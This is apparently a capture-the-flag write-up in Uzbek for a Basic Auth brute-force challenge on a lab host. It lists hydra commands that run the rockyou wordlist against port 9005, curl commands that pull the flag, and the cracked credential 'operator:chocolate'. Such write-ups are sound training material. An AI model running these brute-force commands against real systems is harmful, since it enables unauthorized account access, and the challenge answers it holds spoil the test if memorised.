# 🎯 05 · Brute Force: Basic Auth — yechim

**Status:** HAL QILINDI (credentials topildi)
**Target:** `http://10.15.1.54:9005/`  (tavsifda `10.15.0.238:9005`)
**Himoya:** HTTP Basic Auth · **Username:** `operator` · **Parol:** `chocolate`
**Qoida:** faqat 9005 port. Flag: `HTB{...}`.

## ✅ Topilgan credentials
```
operator : chocolate
```
Ishlagan buyruq:
```bash
hydra -I -l operator -P /usr/share/wordlists/rockyou.txt -s 9005 -t 16 -f \
      10.15.1.54 http-get /
# -> [9005][http-get] host: 10.15.1.54  login: operator  password: chocolate
```

## ✅ Flagni olish
```bash
curl -s -u "operator:chocolate" http://10.15.1.54:9005/ | grep -o 'HTB{[^}]*}'
```

---

## 1) Tekshirish (Basic Auth ekanini tasdiqlash)
```bash
curl -s -i http://10.15.1.54:9005/ | head -20
# WWW-Authenticate: Basic realm="..." va HTTP 401 ko'rinadi
```

## 2) Brute force — `hydra http-get`
Basic Auth uchun `http-get` moduli ishlatiladi (u `401` + `WWW-Authenticate: Basic`
ni o'zi boshqaradi va `Authorization` sarlavhasini yuboradi):

```bash
hydra -I -l operator -P /usr/share/wordlists/rockyou.txt -s 9005 -t 16 -f \
      10.15.1.54 http-get /
```

Natija (kutilgan):
```
[9005][http-get] host: 10.15.1.54   login: operator   password: <PAROL>
1 of 1 target successfully completed, 1 valid password found
```

> Tezroq bo'lishi uchun avval kichik ro'yxat:
> ```bash
> head -5000 /usr/share/wordlists/rockyou.txt > /tmp/top.txt
> hydra -I -l operator -P /tmp/top.txt -s 9005 -t 16 -f 10.15.1.54 http-get /
> ```

## 3) Flagni olish
```bash
curl -s -u "operator:<PAROL>" http://10.15.1.54:9005/ | grep -o 'HTB{[^}]*}'
```

## Muqobil — `brute.py --basic-auth`
```bash
python3 brute.py --url http://10.15.1.54:9005/ \
                 --username operator --basic-auth \
                 --wordlist /usr/share/wordlists/rockyou.txt --threads 32
```

## Bir buyruq bilan
```bash
./getflag_basic.sh          # hydra http-get -> curl -u -> HTB{...}
```

## Eslatmalar
- **Basic Auth'da `F=` shart emas** — hydra `401`/`200` ni o'zi ajratadi.
  (Aksincha, 04-challenge'dagi kabi `F=`/`1=` faqat **web-form** uchun kerak edi.)
- `-V` ishlatmang (sekinlashtiradi). `-t 16..32` tez.
- `rockyou.txt` mashhurlik bo'yicha tartiblangan — TOP qatorlarida tez topiladi.
